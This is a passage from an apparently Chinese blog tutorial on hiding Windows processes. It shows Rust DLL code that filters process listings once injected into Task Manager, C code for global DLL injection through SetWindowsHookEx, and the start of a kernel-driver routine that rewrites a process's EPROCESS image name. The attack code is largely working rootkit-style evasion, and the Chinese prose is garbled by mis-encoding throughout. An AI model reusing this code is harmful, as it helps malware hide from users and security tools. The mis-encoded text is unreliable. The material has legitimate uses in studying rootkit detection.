</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#8b008b;font-weight:bold">if</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>(*psystem_information).NextEntryOffset<span style="color:#bbb"> </span>==<span style="color:#bbb"> </span><span style="color:#b452cd">0</span><span style="color:#bbb"> </span>}<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span><span style="color:#8b008b;font-weight:bold">break</span>;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>psystem_information<span style="color:#bbb"> </span>=<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>psystem_information<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span><span style="color:#00688b;font-weight:bold">u64</span><span style="color:#bbb"> </span>+<span style="color:#bbb"> </span>(*psystem_information).NextEntryOffset<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span><span style="color:#00688b;font-weight:bold">u64</span><span style="color:#bbb"> </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span>*<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span><span style="color:#00688b">SYSTEM_PROCESS_INFORMATION</span>;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>status<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span><span style="color:#cd5555">/// Returns a module symbol&#39;s absolute address.
</span></span></span><span style="display:flex;"><span><span style="color:#cd5555"></span><span style="color:#8b008b;font-weight:bold">fn</span> <span style="color:#008b45">get_module_symbol_address</span>(module: <span style="color:#8b008b;font-weight:bold">&amp;</span><span style="color:#00688b;font-weight:bold">str</span>,<span style="color:#bbb"> </span>symbol: <span style="color:#8b008b;font-weight:bold">&amp;</span><span style="color:#00688b;font-weight:bold">str</span>)<span style="color:#bbb"> </span>-&gt; <span style="color:#658b00">Option</span>&lt;<span style="color:#00688b;font-weight:bold">usize</span>&gt;<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>module<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span>module<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>.encode_utf16()<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>.chain(iter::once(<span style="color:#b452cd">0</span>))<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>.collect::&lt;<span style="color:#658b00">Vec</span>&lt;<span style="color:#00688b;font-weight:bold">u16</span>&gt;&gt;();<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>symbol<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span>CString::new(symbol).unwrap();<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>handle<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span>GetModuleHandleW(<span style="color:#00688b">PCWSTR</span>(module.as_ptr()<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span>_)).unwrap();<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#8b008b;font-weight:bold">match</span><span style="color:#bbb"> </span>GetProcAddress(handle,<span style="color:#bbb"> </span><span style="color:#00688b">PCSTR</span>(symbol.as_ptr()<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span>_))<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span><span style="color:#658b00">Some</span>(func)<span style="color:#bbb"> </span>=&gt;<span style="color:#bbb"> </span><span style="color:#658b00">Some</span>(func<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span><span style="color:#00688b;font-weight:bold">usize</span>),<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span><span style="color:#658b00">None</span><span style="color:#bbb"> </span>=&gt;<span style="color:#bbb"> </span><span style="color:#658b00">None</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span><span style="color:#1e889b">#[no_mangle]</span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">extern</span><span style="color:#bbb"> </span><span style="color:#cd5555">&#34;system&#34;</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">fn</span> <span style="color:#008b45">DllMain</span>(_hinst: <span style="color:#008b45;font-weight:bold">HANDLE</span>,<span style="color:#bbb"> </span>reason: <span style="color:#00688b;font-weight:bold">u32</span>,<span style="color:#bbb"> </span>_reserved: *<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>c_void)<span style="color:#bbb"> </span>-&gt; <span style="color:#008b45;font-weight:bold">BOOL</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">match</span><span style="color:#bbb"> </span>reason<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#00688b">DLL_PROCESS_ATTACH</span><span style="color:#bbb"> </span>=&gt;<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>println!(<span style="color:#cd5555">&#34;attaching&#34;</span>);<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>main().unwrap()<span style="color:#bbb"> </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#00688b">DLL_PROCESS_DETACH</span><span style="color:#bbb"> </span>=&gt;<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>println!(<span style="color:#cd5555">&#34;detaching&#34;</span>);<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#00688b">DLL_THREAD_ATTACH</span><span style="color:#bbb"> </span>=&gt;<span style="color:#bbb"> </span>{}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#00688b">DLL_THREAD_DETACH</span><span style="color:#bbb"> </span>=&gt;<span style="color:#bbb"> </span>{}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>_<span style="color:#bbb"> </span>=&gt;<span style="color:#bbb"> </span>{}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>};<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">return</span><span style="color:#bbb"> </span><span style="color:#00688b">BOOL</span>::from(<span style="color:#8b008b;font-weight:bold">true</span>);<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>}<span style="color:#bbb">
</span></span></span></code></pre></div><p>æ³¨å…¥å‰</p>
<p><img src="https://s2.loli.net/2024/05/31/D2yiMpuP4QCkt8G.png" alt="image-20240521213951309"></p>
<p>æ³¨å…¥ä»»åŠ¡ç®¡ç†å™¨ååˆ™æ— æ³•æœç´¢åˆ°å¯¹åº”çš„è¿›ç¨‹ã€‚</p>
<p><img src="https://s2.loli.net/2024/05/31/O9p6yai3zfNKwuv.png" alt="image-20240521214135198"></p>
<h4 id="å…¨å±€hook-setwindowshookex">[å…¨å±€hook] SetWindowsHookEx</h4>
<p>ä¸Šä¸€ç§API hookçš„å±€é™æ€§æ˜¯æˆ‘éœ€è¦æŒ‡å®šéœ€è¦hookçš„è¿›ç¨‹ï¼Œæ¯”å¦‚æˆ‘éœ€è¦æŒ‡å®šhookä»»åŠ¡ç®¡ç†å™¨ï¼Œä¸ºäº†éšè—è¿›ç¨‹ï¼Œæˆ‘å¯èƒ½è¿˜è¦å¤šhookå‡ ä¸ªç±»ä¼¼çš„è¿›ç¨‹ï¼Œæ¯”å¦‚ProcessHackï¼ŒSysteminfoç­‰ã€‚ä½†æ˜¯æˆ‘å¾ˆéš¾å°½å–„å°½ç¾ï¼ŒæŠŠæ‰€æœ‰éœ€è¦hookçš„ç¨‹åºåç§°éƒ½åŠ åœ¨å…¶ä¸­ï¼Œæ‰€ä»¥è€ƒè™‘åˆ°å…¨å±€hookã€‚å…¨å±€hookåˆ™æ˜¯ä¸éœ€è¦æˆ‘æŒ‡å®šè¿›ç¨‹ï¼Œåªè¦æœ‰è¿›ç¨‹åˆ›å»ºï¼ˆæˆ–è€…å¤åˆæ ‡å‡†çš„è¿›ç¨‹ï¼‰ï¼Œå°±å¾€è¿›ç¨‹ä¸­æ³¨å…¥dllã€‚SetWindowsHookExå°±æ˜¯è¿™æ ·ä¸€ä¸ªWindows API</p>
<blockquote>
<p>ä¸ºäº†èƒ½å¤Ÿè®©DLLæ³¨å…¥æ‰€æœ‰çš„è¿›ç¨‹ä¸­ï¼Œç¨‹åºè®¾ç½®WH_GETMESSAGEæ¶ˆæ¯çš„å…¨å±€é’©å­ã€‚å› ä¸ºWH_GETMESSAGEç±»å‹çš„é’©å­ä¼šç›‘è§†æ¶ˆæ¯é˜Ÿåˆ—ï¼Œç”±äºWindowsç³»ç»Ÿæ˜¯åŸºäºæ¶ˆæ¯é©±åŠ¨çš„ï¼Œæ‰€ä»¥æ‰€æœ‰è¿›ç¨‹éƒ½ä¼šæœ‰è‡ªå·±çš„ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œéƒ½ä¼šåŠ è½½WH_GETMESSAGEç±»å‹çš„å…¨å±€é’©å­DLLã€‚ &mdash;-ã€ŠWindowsé»‘å®¢ç¼–ç¨‹æŠ€æœ¯è¯¦è§£ã€‹</p></blockquote>
<p>windowsæ­£å¸¸æ¶ˆæ¯å¤„ç†æµç¨‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://s2.loli.net/2024/05/31/TIQZJ8ozOMFAbnD.png" alt=""></p>
<p>ä½¿ç”¨SetWindowsHookExä¹‹åçš„æ¶ˆæ¯å¤„ç†æµç¨‹åˆ™æ˜¯</p>
<p><img src="https://s2.loli.net/2024/05/31/hqS8JuYQlEZsmwb.png" alt=""></p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HHOOK <span style="color:#008b45">SetWindowsHookExA</span>(
</span></span><span style="display:flex;"><span>  [in] <span style="color:#00688b;font-weight:bold">int</span>       idHook,
</span></span><span style="display:flex;"><span>  [in] HOOKPROC  lpfn,
</span></span><span style="display:flex;"><span>  [in] HINSTANCE hmod,
</span></span><span style="display:flex;"><span>  [in] DWORD     dwThreadId
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><ul>
<li>
<p>idHook: éœ€è¦å®‰è£…hookçš„ç±»å‹ï¼Œå¯ä»¥å®‰è£…é”®ç›˜hookï¼ˆWH_KEYBOARDï¼‰ï¼Œé¼ æ ‡hookï¼ˆWH_MOUSEï¼‰ï¼Œæˆ‘ä»¬å…¨å±€hookæ³¨å…¥dllçš„è¯ï¼Œéœ€è¦ä½¿ç”¨<strong>WH_GETMESSAGE</strong>ç±»å‹</p>
</li>
<li>
<p>lpfn: æŒ‡å‘ç›¸åº”çš„æŒ‚é’©å¤„ç†è¿‡ç¨‹.è‹¥å‚æ•°dwThreadIdä¸º0æˆ–è€…æŒ‡ç¤ºäº†ä¸€ä¸ªå…¶ä»–è¿›ç¨‹åˆ›å»ºçš„çº¿ç¨‹ä¹‹æ ‡è¯†ç¬¦,åˆ™å‚æ•°lpfnå¿…é¡»æŒ‡å‘ä¸€ä¸ªåŠ¨æ€é“¾æ¥ä¸­çš„æŒ‚é’©å¤„ç†è¿‡ç¨‹.å¦åˆ™,å‚æ•°lpfnå¯ä»¥æŒ‡å‘ä¸€ä¸ªä¸å½“å‰è¿›ç¨‹ç›¸å…³çš„ä»£ç ä¸­å®šä¹‰çš„æŒ‚é’©å¤„ç†è¿‡ç¨‹ã€‚</p>
</li>
<li>
<p>hmod: DLL çš„å¥æŸ„ï¼Œå…¶ä¸­åŒ…å« <em>lpfn</em> å‚æ•°æŒ‡å‘çš„æŒ‚é’©è¿‡ç¨‹ã€‚ å¦‚æœ <em>dwThreadId</em> å‚æ•°æŒ‡å®šå½“å‰è¿›ç¨‹åˆ›å»ºçš„çº¿ç¨‹ï¼Œå¹¶ä¸”æŒ‚é’©è¿‡ç¨‹ä½äºä¸å½“å‰è¿›ç¨‹å…³è”çš„ä»£ç ä¸­ï¼Œåˆ™å¿…é¡»å°† <em>hMod</em> å‚æ•°è®¾ç½®ä¸º <strong>NULL</strong>ã€‚</p>
</li>
<li>
<p>dwThreadIdï¼šæŒ‡ç¤ºäº†ä¸€ä¸ªçº¿ç¨‹æ ‡è¯†ç¬¦,æŒ‚é’©å¤„ç†è¿‡ç¨‹ä¸çº¿ç¨‹ç›¸å…³.è‹¥æ­¤å‚æ•°å€¼ä¸º0,åˆ™è¯¥æŒ‚é’©å¤„ç†è¿‡ç¨‹ä¸æ‰€æœ‰ç°å­˜çš„çº¿ç¨‹ç›¸å…³</p>
</li>
</ul>
<p>ä»£ç å‚è€ƒäº†è¿™ç¯‡<a href="https://blog.csdn.net/kingkee/article/details/97390029">æ–‡ç« </a></p>
<p>DLLä»£ç :</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#228b22">// GlobalHook_Test.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å¯¼å‡ºå‡½æ•°ã€‚
</span></span></span><span style="display:flex;"><span><span style="color:#228b22">//
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span> 
</span></span><span style="display:flex;"><span><span style="color:#1e889b">#include</span> <span style="color:#1e889b">&#34;stdafx.h&#34;</span><span style="color:#1e889b">
</span></span></span><span style="display:flex;"><span><span style="color:#1e889b"></span> 
</span></span><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">extern</span> HMODULE g_hDllModule;
</span></span><span style="display:flex;"><span><span style="color:#228b22">// å…±äº«å†…å­˜
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span><span style="color:#1e889b">#pragma data_seg(&#34;mydata&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#1e889b"></span>    HHOOK g_hHook = <span style="color:#658b00">NULL</span>;
</span></span><span style="display:flex;"><span><span style="color:#1e889b">#pragma data_seg()
</span></span></span><span style="display:flex;"><span><span style="color:#1e889b">#pragma comment(linker, &#34;/SECTION:mydata,RWS&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#1e889b"></span> 
</span></span><span style="display:flex;"><span><span style="color:#228b22">// é’©å­å›è°ƒå‡½æ•°
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>LRESULT <span style="color:#008b45">GetMsgProc</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#00688b;font-weight:bold">int</span> code,
</span></span><span style="display:flex;"><span>	WPARAM wParam,
</span></span><span style="display:flex;"><span>	LPARAM lParam)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#8b008b;font-weight:bold">return</span> ::<span style="color:#008b45">CallNextHookEx</span>(g_hHook, code, wParam, lParam);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#228b22">// è®¾ç½®å…¨å±€é’©å­
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>BOOL <span style="color:#008b45">SetGlobalHook</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	g_hHook = ::<span style="color:#008b45">SetWindowsHookEx</span>(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, <span style="color:#b452cd">0</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#8b008b;font-weight:bold">if</span> (<span style="color:#658b00">NULL</span> == g_hHook)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#8b008b;font-weight:bold">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#8b008b;font-weight:bold">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#228b22">// å¸è½½é’©å­
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>BOOL <span style="color:#008b45">UnsetGlobalHook</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#8b008b;font-weight:bold">if</span> (g_hHook)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		::<span style="color:#008b45">UnhookWindowsHookEx</span>(g_hHook);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#8b008b;font-weight:bold">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ä¸Šé¢æ˜¯dllçš„ä»£ç ï¼Œç„¶åç¼–è¯‘è°ƒç”¨è¿™ä¸ªdllçš„ä»£ç </p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#1e889b">#include</span> <span style="color:#1e889b">&#34;stdafx.h&#34;</span><span style="color:#1e889b">
</span></span></span><span style="display:flex;"><span><span style="color:#1e889b">#include</span> <span style="color:#1e889b">&lt;Windows.h&gt;</span><span style="color:#1e889b">
</span></span></span><span style="display:flex;"><span><span style="color:#1e889b"></span> 
</span></span><span style="display:flex;"><span><span style="color:#00688b;font-weight:bold">int</span> <span style="color:#008b45">_tmain</span>(<span style="color:#00688b;font-weight:bold">int</span> argc, _TCHAR* argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#8b008b;font-weight:bold">typedef</span> <span style="color:#008b45">BOOL</span>(*typedef_SetGlobalHook)();
</span></span><span style="display:flex;"><span>	<span style="color:#8b008b;font-weight:bold">typedef</span> <span style="color:#008b45">BOOL</span>(*typedef_UnsetGlobalHook)();
</span></span><span style="display:flex;"><span>	HMODULE hDll = <span style="color:#658b00">NULL</span>;
</span></span><span style="display:flex;"><span>	typedef_SetGlobalHook SetGlobalHook = <span style="color:#658b00">NULL</span>;
</span></span><span style="display:flex;"><span>	typedef_UnsetGlobalHook UnsetGlobalHook = <span style="color:#658b00">NULL</span>;
</span></span><span style="display:flex;"><span>	BOOL bRet = FALSE;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>	<span style="color:#8b008b;font-weight:bold">do</span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		hDll = ::<span style="color:#008b45">LoadLibrary</span>(<span style="color:#cd5555">&#34;GlobalHook_Test.dll&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#8b008b;font-weight:bold">if</span> (<span style="color:#658b00">NULL</span> == hDll)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#008b45">printf</span>(<span style="color:#cd5555">&#34;LoadLibrary Error[%d]</span><span style="color:#cd5555">\n</span><span style="color:#cd5555">&#34;</span>, ::<span style="color:#008b45">GetLastError</span>());
</span></span><span style="display:flex;"><span>			<span style="color:#8b008b;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>		SetGlobalHook = (typedef_SetGlobalHook)::<span style="color:#008b45">GetProcAddress</span>(hDll, <span style="color:#cd5555">&#34;SetGlobalHook&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#8b008b;font-weight:bold">if</span> (<span style="color:#658b00">NULL</span> == SetGlobalHook)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#008b45">printf</span>(<span style="color:#cd5555">&#34;GetProcAddress Error[%d]</span><span style="color:#cd5555">\n</span><span style="color:#cd5555">&#34;</span>, ::<span style="color:#008b45">GetLastError</span>());
</span></span><span style="display:flex;"><span>			<span style="color:#8b008b;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>		bRet = <span style="color:#008b45">SetGlobalHook</span>();
</span></span><span style="display:flex;"><span>		<span style="color:#8b008b;font-weight:bold">if</span> (bRet)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#008b45">printf</span>(<span style="color:#cd5555">&#34;SetGlobalHook OK.</span><span style="color:#cd5555">\n</span><span style="color:#cd5555">&#34;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#8b008b;font-weight:bold">else</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#008b45">printf</span>(<span style="color:#cd5555">&#34;SetGlobalHook ERROR.</span><span style="color:#cd5555">\n</span><span style="color:#cd5555">&#34;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>		<span style="color:#008b45">system</span>(<span style="color:#cd5555">&#34;pause&#34;</span>);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>		UnsetGlobalHook = (typedef_UnsetGlobalHook)::<span style="color:#008b45">GetProcAddress</span>(hDll, <span style="color:#cd5555">&#34;UnsetGlobalHook&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#8b008b;font-weight:bold">if</span> (<span style="color:#658b00">NULL</span> == UnsetGlobalHook)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#008b45">printf</span>(<span style="color:#cd5555">&#34;GetProcAddress Error[%d]</span><span style="color:#cd5555">\n</span><span style="color:#cd5555">&#34;</span>, ::<span style="color:#008b45">GetLastError</span>());
</span></span><span style="display:flex;"><span>			<span style="color:#8b008b;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#008b45">UnsetGlobalHook</span>();
</span></span><span style="display:flex;"><span>		<span style="color:#008b45">printf</span>(<span style="color:#cd5555">&#34;UnsetGlobalHook OK.</span><span style="color:#cd5555">\n</span><span style="color:#cd5555">&#34;</span>);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>	}<span style="color:#8b008b;font-weight:bold">while</span>(FALSE);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>	<span style="color:#008b45">system</span>(<span style="color:#cd5555">&#34;pause&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#b452cd">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>è¿™ç§æ–¹æ³•é’ˆå¯¹äºæœ‰çª—å£çš„ç¨‹åºï¼Œå¦‚æœæ˜¯å‘½ä»¤è¡Œçš„å°±æ²¡æœ‰æ¶ˆæ¯ä¼ é€’æœºåˆ¶ï¼Œæ— æ³•ä½¿ç”¨SetWindowsHookExæ¥å…¨å±€æ³¨å…¥ã€‚æ¯”å¦‚<code>Tasklist.exe</code>æŸ¥çœ‹è¿›ç¨‹ï¼Œå°±æ²¡æ³•åšåˆ°éšè—è¿›ç¨‹</p>
<h4 id="å…¨å±€hook-hook-explorer">[å…¨å±€hook] Hook Explorer</h4>
<p>è¿™æ˜¯å…¨å±€hookçš„ä¸€ç§æ€è·¯ï¼Œé€šè¿‡hook explorer.exeè¿›ç¨‹ï¼Œå½“æ–°è¿›ç¨‹åˆ›å»ºéƒ½æ˜¯ä½œä¸ºexplorer.exeçš„å­è¿›ç¨‹ï¼Œæ‰€ä»¥é¦–å…ˆhook explorer.exeä¸­çš„<code>CreateProcess</code>ã€‚ç›‘æ§æ¯ä¸€ä¸ªè¿›ç¨‹çš„åˆ›å»ºã€‚å½“ç›®æ ‡è¿›ç¨‹(ä»»åŠ¡ç®¡ç†å™¨ç­‰)åˆ›å»ºæ—¶ï¼Œå†å‘ç›®æ ‡è¿›ç¨‹æ³¨å…¥</p>
<p>// TODO</p>
<h2 id="r0éšè—ä¿¡æ¯">R0éšè—ä¿¡æ¯</h2>
<h3 id="r0ä¼ªé€ ä¿¡æ¯">R0ä¼ªé€ ä¿¡æ¯</h3>
<p>è¿™é‡Œæ˜¯é’ˆå¯¹<code>_EPROCESS</code>ï¼Œä¿®æ”¹ç›¸åº”çš„ä¿¡æ¯</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#228b22">//0xa40 bytes (sizeof)
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span><span style="color:#8b008b;font-weight:bold">struct</span> _EPROCESS
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8b008b;font-weight:bold">struct</span> _KPROCESS Pcb;                                                   <span style="color:#228b22">//0x0
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>    <span style="color:#8b008b;font-weight:bold">struct</span> _EX_PUSH_LOCK ProcessLock;                                       <span style="color:#228b22">//0x438
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>    VOID* UniqueProcessId;                                                  <span style="color:#228b22">//0x440
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>    <span style="color:#8b008b;font-weight:bold">struct</span> _LIST_ENTRY ActiveProcessLinks;                                  <span style="color:#228b22">//0x448
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>    ...
</span></span><span style="display:flex;"><span>    UCHAR ImageFileName[<span style="color:#b452cd">15</span>];                                                <span style="color:#228b22">//0x5a8
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span>    ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>EPROCESSä¸­æœ‰ä¸€ä¸ªå±æ€§å€¼æ˜¯<code>ImageFileName</code>ï¼Œæ ‡å¿—çš„æ˜¯ç¨‹åºåç§°ï¼Œè¿™ä¸ªå€¼æ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„ï¼Œæ‰€ä»¥å¯ä»¥åœ¨é©±åŠ¨å±‚ä¿®æ”¹</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">typedef</span> <span style="color:#8b008b;font-weight:bold">struct</span> SET_IMAGE_NAME {
</span></span><span style="display:flex;"><span>    UCHAR bImageName[<span style="color:#b452cd">250</span>];
</span></span><span style="display:flex;"><span>    UINT64 pid;
</span></span><span style="display:flex;"><span>}SET_IMAGE_NAME, *PSET_IMAGE_NAME ;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NTSTATUS <span style="color:#008b45">SetImageName</span>(PSET_IMAGE_NAME pSetImageName)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    PEPROCESS     pEprocess, pCurProcess;
</span></span><span style="display:flex;"><span>    PUCHAR        pOldImageName;
</span></span><span style="display:flex;"><span>    SIZE_T        len;
</span></span><span style="display:flex;"><span>    PLIST_ENTRY64 pActiveProcessLinks;
